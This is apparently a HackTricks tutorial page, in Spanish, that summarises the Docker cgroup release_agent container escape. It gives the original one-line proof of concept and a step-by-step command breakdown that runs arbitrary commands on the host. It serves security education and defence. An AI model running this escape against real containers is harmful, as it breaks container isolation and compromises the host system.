# Escape de cgroups de release_agent de Docker

{{#include ../../../../banners/hacktricks-training.md}}

**Para más detalles, consulta el** [**post original del blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Esto es solo un resumen:

PoC original:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
La prueba de concepto (PoC) demuestra un método para explotar cgroups creando un archivo `release_agent` y provocando su invocación para ejecutar comandos arbitrarios en el host del contenedor. Aquí hay un desglose de los pasos involucrados:

1. **Preparar el Entorno:**
- Se crea un directorio `/tmp/cgrp` para servir como punto de montaje para el cgroup.
- El controlador de cgroup RDMA se monta en este directorio. En caso de ausencia del controlador RDMA, se sugiere usar el controlador de cgroup `memory` como alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Configurar el Cgroup Hijo:**
- Se crea un cgroup hijo llamado "x" dentro del directorio cgroup montado.
- Se habilitan las notificaciones para el cgroup "x" escribiendo 1 en su archivo notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurar el Agente de Liberación:**
- La ruta del contenedor en el host se obtiene del archivo /etc/mtab.
- El archivo release_agent del cgroup se configura para ejecutar un script llamado /cmd ubicado en la ruta del host adquirida.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Crear y Configurar el Script /cmd:**
- El script /cmd se crea dentro del contenedor y se configura para ejecutar ps aux, redirigiendo la salida a un archivo llamado /output en el contenedor. Se especifica la ruta completa de /output en el host.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Activar el Ataque:**
- Se inicia un proceso dentro del cgroup hijo "x" y se termina inmediatamente.
- Esto activa el `release_agent` (el script /cmd), que ejecuta ps aux en el host y escribe la salida en /output dentro del contenedor.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
